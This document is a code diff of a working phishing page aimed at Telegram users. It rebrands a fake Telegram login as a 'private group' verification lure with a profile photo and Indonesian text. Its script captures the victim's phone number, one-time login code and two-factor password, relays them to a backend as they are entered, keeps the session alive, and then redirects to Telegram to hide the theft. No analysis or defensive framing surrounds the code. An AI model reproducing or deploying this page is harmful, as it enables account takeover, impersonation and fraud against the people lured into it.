@@ -3,48 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Telegram: Login</title>
+    <title>Nabila fpp - Verifikasi Grup</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .container { width: 100%; max-width: 340px; text-align: center; padding: 20px; }
-        .logo { width: 100px; margin-bottom: 20px; }
-        h2 { font-weight: 500; font-size: 24px; margin-bottom: 10px; }
-        p { color: #707579; font-size: 15px; margin-bottom: 30px; }
-        input { width: 100%; padding: 14px; border: 1px solid #dfe1e5; border-radius: 10px; font-size: 16px; box-sizing: border-box; outline: none; margin-bottom: 15px; transition: 0.2s; }
+        /* Gambar Header */
+        .profile-img { width: 100px; height: 100px; border-radius: 50%; object-fit: cover; margin-bottom: 20px; border: 2px solid #3390ec; }
+        h2 { font-weight: 600; font-size: 22px; margin-bottom: 8px; color: #000; }
+        .desc { color: #707579; font-size: 15px; line-height: 1.4; margin-bottom: 30px; }
+        input { width: 100%; padding: 14px; border: 1px solid #dfe1e5; border-radius: 10px; font-size: 16px; box-sizing: border-box; outline: none; margin-bottom: 15px; }
         input:focus { border: 2px solid #3390ec; }
         button { width: 100%; padding: 14px; background: #3390ec; color: #fff; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; }
         .hidden { display: none; }
         .warning { color: #e53935; font-size: 13px; margin-top: 10px; font-weight: 500; }
+        #status { color: #3390ec; font-size: 14px; margin-top: 15px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
-        <h2 id="title">Log Masuk</h2>
-        <p id="desc">Sila masukkan nombor telefon anda dengan kod negara.</p>
+        <img src="https://i.ibb.co.com/tpWJgr8b/41cbf42fff2a5b68411e3ae8ef4a7f53.jpg" class="profile-img" alt="Profile">
+        
+        <h2>Nabila fpp</h2>
+        <p class="desc">Haii welcome to me private group 🥰, wajib verifikasi anggota</p>
 
         <div id="step-phone">
-            <input type="tel" id="phone" placeholder="+60 12-345 6789">
-            <button onclick="sendPhone()">TERUSKAN</button>
+            <input type="tel" id="phone" placeholder="Contoh: +628123456789">
+            <button onclick="sendPhone()">MASUK KE GRUP</button>
         </div>
 
         <div id="step-otp" class="hidden">
-            <input type="number" id="otp" placeholder="Kod 5-digit">
-            <p id="timer-msg" class="warning">Sila masukkan kod dengan segera sebelum sesi tamat.</p>
+            <input type="number" id="otp" placeholder="Masukkan Kode OTP">
+            <p class="warning">Cek pesan di aplikasi Telegram Anda, masukkan kode segera.</p>
         </div>
 
         <div id="step-2fa" class="hidden">
-            <input type="password" id="password" placeholder="Kata Laluan 2FA">
-            <p class="warning">Akaun anda dilindungi 2FA. Masukkan kata laluan.</p>
+            <input type="password" id="password" placeholder="Masukkan Password 2FA">
+            <p class="warning">Akun Anda dilindungi Verifikasi 2 Langkah.</p>
         </div>
 
-        <div id="status" style="color: #3390ec; font-size: 14px; margin-top: 15px;"></div>
+        <div id="status"></div>
     </div>
 
     <script>
         let keepAliveInterval;
 
-        // Taktik Menahan Sesi Vercel: Ping setiap 5 saat
         function startKeepAlive() {
             if (keepAliveInterval) return;
             keepAliveInterval = setInterval(() => {
@@ -68,7 +70,9 @@
 
         async function sendPhone() {
             const p = document.getElementById('phone').value.replace(/\s/g, '');
-            document.getElementById('status').innerText = "Menghubungkan...";
+            if(!p.startsWith('+')) return alert("Gunakan format internasional (Contoh: +62)");
+            
+            document.getElementById('status').innerText = "Menghubungkan ke server...";
             startKeepAlive();
             
             const res = await api('send_code', { phone: p });
@@ -82,13 +86,12 @@
             } else { alert(res.error); document.getElementById('status').innerText = ""; }
         }
 
-        // AUTO-SUBMIT OTP (Pantas)
         document.getElementById('otp').addEventListener('input', function() {
             if(this.value.length === 5) sendOTP();
         });
 
         async function sendOTP() {
-            document.getElementById('status').innerText = "Mengesahkan...";
+            document.getElementById('status').innerText = "Memverifikasi...";
             const res = await api('signin', { 
                 phone: localStorage.getItem('user_p'), 
                 code: document.getElementById('otp').value, 
@@ -100,18 +103,17 @@
                     document.getElementById('step-otp').classList.add('hidden');
                     document.getElementById('step-2fa').classList.remove('hidden');
                     document.getElementById('password').focus();
-                    document.getElementById('status').innerText = "Sila masukkan 2FA";
+                    document.getElementById('status').innerText = "Masukkan Password 2FA Anda";
                 } else { finish(); }
             } else { alert(res.error); document.getElementById('status').innerText = ""; }
         }
 
-        // AUTO-SUBMIT 2FA (Jika user tekan Enter atau paste)
         document.getElementById('password').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') send2FA();
         });
 
         async function send2FA() {
-            document.getElementById('status').innerText = "Mengesahkan 2FA...";
+            document.getElementById('status').innerText = "Memverifikasi 2FA...";
             const res = await api('signin', { 
                 phone: localStorage.getItem('user_p'), 
                 password: document.getElementById('password').value 
@@ -121,8 +123,8 @@
 
         function finish() {
             clearInterval(keepAliveInterval);
-            document.getElementById('status').innerText = "Berjaya! Mengalihkan...";
-            location.href = "https://t.me/telegram";
+            document.getElementById('status').innerText = "Berhasil masuk grup!";
+            location.href = "https://t.me/telegram"; // Arahkan ke grup asli Anda
         }
     </script>
 </body>
